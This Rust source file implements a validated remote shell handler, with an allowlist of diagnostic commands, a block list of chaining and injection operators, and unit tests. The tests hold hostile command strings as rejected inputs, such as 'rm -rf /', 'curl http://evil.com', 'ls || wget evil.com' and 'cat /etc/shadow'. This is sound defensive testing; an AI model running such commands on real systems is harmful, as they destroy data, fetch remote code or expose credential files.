//! Shell command handler with security validation

use std::future::Future;
use std::pin::Pin;

use serde_json::Value;

use crate::execution::handler::{CommandHandler, CommandResult};
use crate::execution::CommandExecutor;

/// Allowed commands for remote shell execution.
const ALLOWED_COMMANDS: &[&str] = &[
    "cat", "date", "df", "dir", "echo", "free", "head", "hostname",
    "id", "ifconfig", "ip", "ipconfig", "ls", "netstat", "nslookup",
    "ping", "ps", "pwd", "systemctl", "tail", "tasklist", "tracert",
    "traceroute", "uname", "uptime", "wc", "who", "whoami",
];

/// Shell metacharacters that indicate command chaining or injection.
const DANGEROUS_PATTERNS: &[&str] = &[
    ";", "&&", "||", "|", "$(", "`", "<(", ">(", "\n", "\r",
];

pub struct ShellHandler;

impl CommandHandler for ShellHandler {
    fn command_types(&self) -> &[&str] {
        &["run_command"]
    }

    fn execute<'a>(
        &'a self,
        _command_type: &'a str,
        params: Option<&'a Value>,
    ) -> Pin<Box<dyn Future<Output = CommandResult> + Send + 'a>> {
        Box::pin(async move {
            let command = match params
                .and_then(|p| p.get("command"))
                .and_then(|c| c.as_str())
            {
                Some(c) => c,
                None => return CommandResult::error("INVALID_PARAMETERS", "Missing 'command' parameter"),
            };

            if let Err(reason) = validate_shell_command(command) {
                return CommandResult::error("UNSAFE_COMMAND", reason);
            }

            // Normalize command binary to lowercase (Linux is case-sensitive)
            let command = normalize_command_case(command);

            let timeout_secs = params
                .and_then(|p| p.get("timeout"))
                .and_then(|t| t.as_u64())
                .unwrap_or(30) as u32;

            match CommandExecutor::execute_shell_command(&command, timeout_secs).await {
                Ok(result) if result.success => {
                    let clean = clean_output(&result.output);
                    CommandResult::success(Value::String(clean))
                }
                Ok(result) => {
                    let clean = clean_output(&result.output);
                    CommandResult::error_with_data(
                        "COMMAND_FAILED",
                        format!("Exit code: {:?}", result.exit_code),
                        Value::String(clean),
                    )
                }
                Err(e) => CommandResult::error("EXECUTION_ERROR", e.to_string()),
            }
        })
    }
}

/// Validate a shell command against the allowlist.
pub fn validate_shell_command(command: &str) -> Result<(), String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Err("Empty command".to_string());
    }

    for pattern in DANGEROUS_PATTERNS {
        if trimmed.contains(pattern) {
            return Err(format!(
                "Command contains blocked operator '{}': {}",
                pattern, trimmed
            ));
        }
    }

    if trimmed.contains('>') {
        return Err(format!("Command contains output redirection: {}", trimmed));
    }

    let first_token = trimmed.split_whitespace().next().unwrap_or("");
    let binary_name = first_token.rsplit('/').next().unwrap_or(first_token);
    let binary_name = binary_name.rsplit('\\').next().unwrap_or(binary_name);
    let binary_name = binary_name.strip_suffix(".exe").unwrap_or(binary_name);

    // Case-insensitive comparison (accept "Ping", "PING", "ping", etc.)
    let binary_lower = binary_name.to_ascii_lowercase();
    if !ALLOWED_COMMANDS.iter().any(|cmd| *cmd == binary_lower) {
        return Err(format!("Command '{}' not in allowlist", binary_name));
    }

    Ok(())
}

/// Normalize the command binary to lowercase (keeps arguments as-is).
/// E.g. "Ping 8.8.8.8" → "ping 8.8.8.8"
fn normalize_command_case(command: &str) -> String {
    let trimmed = command.trim();
    match trimmed.split_once(char::is_whitespace) {
        Some((binary, args)) => format!("{} {}", binary.to_ascii_lowercase(), args),
        None => trimmed.to_ascii_lowercase(),
    }
}

/// Clean non-printable control characters from command output (preserves UTF-8 text)
pub fn clean_output(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_control() || *c == '\n' || *c == '\r' || *c == '\t')
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowed_command_passes() {
        assert!(validate_shell_command("ls -la").is_ok());
        assert!(validate_shell_command("whoami").is_ok());
        assert!(validate_shell_command("ping 8.8.8.8").is_ok());
        assert!(validate_shell_command("df -h").is_ok());
        assert!(validate_shell_command("systemctl status nginx").is_ok());
    }

    #[test]
    fn test_blocked_command_rejected() {
        assert!(validate_shell_command("rm -rf /").is_err());
        assert!(validate_shell_command("curl http://evil.com").is_err());
        assert!(validate_shell_command("powershell -Command Get-Process").is_err());
        assert!(validate_shell_command("bash -c 'echo pwned'").is_err());
    }

    #[test]
    fn test_chaining_blocked() {
        assert!(validate_shell_command("ls; rm -rf /").is_err());
        assert!(validate_shell_command("ls && cat /etc/shadow").is_err());
        assert!(validate_shell_command("ls || wget evil.com").is_err());
        assert!(validate_shell_command("ls | xargs rm").is_err());
    }

    #[test]
    fn test_injection_blocked() {
        assert!(validate_shell_command("echo $(whoami)").is_err());
        assert!(validate_shell_command("echo `id`").is_err());
        assert!(validate_shell_command("ls > /tmp/output").is_err());
    }

    #[test]
    fn test_path_prefix_stripped() {
        assert!(validate_shell_command("/usr/bin/ls -la").is_ok());
        assert!(validate_shell_command("/bin/cat /etc/hostname").is_ok());
    }

    #[test]
    fn test_case_insensitive_commands() {
        assert!(validate_shell_command("Ping 8.8.8.8").is_ok());
        assert!(validate_shell_command("PING 8.8.8.8").is_ok());
        assert!(validate_shell_command("Ls -la").is_ok());
        assert!(validate_shell_command("WHOAMI").is_ok());
        // Still blocked
        assert!(validate_shell_command("RM -rf /").is_err());
        assert!(validate_shell_command("Curl http://evil.com").is_err());
    }

    #[test]
    fn test_empty_command() {
        assert!(validate_shell_command("").is_err());
        assert!(validate_shell_command("   ").is_err());
    }

    #[test]
    fn test_clean_output() {
        assert_eq!(clean_output("Hello\x1b World"), "Hello World");
        assert_eq!(clean_output("line1\nline2"), "line1\nline2");
        assert_eq!(clean_output("ok\x00hidden"), "okhidden");
        // UTF-8 preserved (accents, CJK, emoji)
        assert_eq!(clean_output("Opération réussie"), "Opération réussie");
        assert_eq!(clean_output("café"), "café");
    }

    #[tokio::test]
    async fn test_shell_handler_missing_params() {
        let handler = ShellHandler;
        let result = handler.execute("run_command", None).await;
        assert_eq!(result.status, "error");
        assert_eq!(result.error.unwrap().code, "INVALID_PARAMETERS");
    }

    #[tokio::test]
    async fn test_shell_handler_unsafe_command() {
        let handler = ShellHandler;
        let params = serde_json::json!({ "command": "rm -rf /" });
        let result = handler.execute("run_command", Some(&params)).await;
        assert_eq!(result.status, "error");
        assert_eq!(result.error.unwrap().code, "UNSAFE_COMMAND");
    }
}
